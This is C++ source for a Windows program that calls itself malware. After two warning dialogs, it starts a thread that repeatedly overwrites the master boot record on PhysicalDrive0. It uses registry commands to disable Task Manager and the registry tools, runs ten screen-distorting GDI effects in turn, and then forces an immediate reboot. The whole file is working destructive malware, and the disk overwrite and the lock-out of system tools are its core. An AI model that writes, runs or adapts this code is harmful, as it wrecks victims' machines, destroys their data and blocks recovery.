#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace Colors
{
	RGBQUAD HSVtoRGB(HSV hsv)
	{
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

		switch (hi)
		{
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad)
	{
		HSV hsv;

		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;

		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;

		hsv.v = cmax;

		if (cmax > 0.0)
			hsv.s = delta / cmax;
		else
			hsv.s = 0.0;

		if (delta > 0.0)
		{
			if (cmax == rd)
				hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd)
				hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd)
				hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

			if (hsv.h < 0.0)
				hsv.h += 360.0;
		}
		else
		{
			hsv.h = 0.0;
		}

		return hsv;
	}
}
const unsigned char MasterBootRecord[512] = {};

DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

DWORD WINAPI payload1(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 1;
	int hs = h / 1;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		int color = rand() % 360;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				hsv.h = fmod(color, 360.0);

				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		Sleep(rand() % 1000);

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		StretchBlt(dc, 0, 0, w, h, dc, 0, 0, w, h, PATINVERT);
	}

	return 0x00;
}
DWORD WINAPI payload2(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	//Just added a HALFTONE effect
	SetStretchBltMode(dcCopy, HALFTONE);
	SetStretchBltMode(dc, HALFTONE);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) + (zy + i);

				rgbquad[index].rgbRed -= fx;
				rgbquad[index].rgbGreen -= fx;
				rgbquad[index].rgbBlue -= fx;
			}
		}

		i++; angle -= 0.01f;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

		Sleep(rand() % 10);
	}

	return 0x00;
}
DWORD WINAPI payload3(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	//semi-major axis and semi-minor axis
	FLOAT a = 5.0;
	FLOAT b = 3.0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		//Set a random (x,y) pos
		int randx = rand() % ws;
		int randy = rand() % hs;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - randx;
				int cy = y - randy;

				//(x²/a²) + (y²+b²) = 1
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);

				//Plasma it
				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

				//Convert the screen colors to HSV
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				//Apply the effect from fx+i [0,360]
				hsv.h = fmod(fx + i, 360.0);

				//Return the HSV back to RGB and show it
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

	}

	return 0x00;
}

DWORD WINAPI payload4(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 32;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x + (ws / 2);
				int cy = y + (hs / 2);

				int zx = (cx * cx);
				int zy = (cy * cy);

				int di = 128.0 + i;

				int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				hsv.h += fmod(fx + i, 360.0);

				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		Sleep(rand() % 1000);
	}

	return 0x00;
}
DWORD WINAPI payload5(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 32;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - (ws / 2);
				int cy = y - (hs / 2);

				int zx = (cx * cx);
				int zy = (cy * cy);

				int di = 128.0 + i;

				int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				hsv.h += fmod(fx + i, 360.0);

				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		Sleep(rand() % 1000);
	}

	return 0x00;
}
DWORD WINAPI payload6(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	//semi-major axis and semi-minor axis
	FLOAT a = 5.0;
	FLOAT b = 3.0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		//Set a random (x,y) pos
		int randx = rand() % ws;
		int randy = rand() % hs;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - randx;
				int cy = y - randy;

				//(x²/a²) + (y²+b²) = 1
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);

				//Plasma it
				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

				//Convert the screen colors to HSV
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				//Apply the effect from fx+i [0,360]
				hsv.h = fmod(fx + i, 360.0);

				//Return the HSV back to RGB and show it
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
		Sleep(rand() % 1000);
	}

	return 0x00;
}
DWORD WINAPI payload7(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				//CenterX and CenterY
				int cx = (x - (ws / 2));
				int cy = (y - (hs / 2));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) + (zy + i);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++; angle += 0.01f;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

		Sleep(rand() % 10);

		if (rand() % 25 == 0)
		{
		}
	}

	return 0x00;
}
DWORD WINAPI payload8(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				/*
				  Now its the absolute value
					 Like a Kaleidoscope
				*/

				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) + (zy + i);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++; angle += 0.01f;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

		Sleep(rand() % 10);

		if (rand() % 25 == 0)
		{
		}
	}

	return 0x00;
}
DWORD WINAPI gomuse(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	//Just added a HALFTONE effect
	SetStretchBltMode(dcCopy, HALFTONE);
	SetStretchBltMode(dc, HALFTONE);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) - (zy + i);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++; angle += 0.01f;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

	}

	return 0x00;
}
DWORD WINAPI payload10(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 8;
	int hs = h / 8;

	BLENDFUNCTION blur = { 0 };
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	//Set our blur
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 30;

	//Counter variable
	INT i = 9;

	while (1)
	{
		//Random position at the memory
		StretchBlt(dcCopy, rand() % 9, rand() % 9, ws, hs, dc, rand() % 9, rand() % 9, w, h, SRCCOPY);

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				rgbquad[index].rgbRed += i;
				rgbquad[index].rgbGreen += i;
				rgbquad[index].rgbBlue += i;
			}
		}

		i++;

		Sleep(rand() % 500);
		AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);

		if (rand() % 5 == 0)
		{
		}
	}

	return 0x00;
}
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Warning!!!\r\n"
		"This software is not recommended to run this on your real machine\r\n"
		"Because this software is not safe to run to your real computer, also\r\n"
		"it can damage your system and overwrite your bootloader or MBR\r\n"
		"(Master boot record) to make your computer unusable and to mulfunction.\r\n"
		"MBR or Master Boot Record is important file to boot up your computer,\r\n"
		"if you overwrite or format it, your computer will be unusable, and\r\n"
		"it will don't bootable again", L"MALWARE WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"          LAST WARNING          \r\nTHE CREATORS ARE WILL BE NOT RESPONSIBLE FOR ANY DAMAGES!!!", L"THIS IS YOUR LAST WARNING!!!", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			HANDLE thread1do2 = CreateThread(0, 0, mbr, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, Disable, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			HANDLE thread9 = CreateThread(0, 0, gomuse, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			system("C:\\Windows\\System32\\shutdown /r /t 0");
		}
	}
}
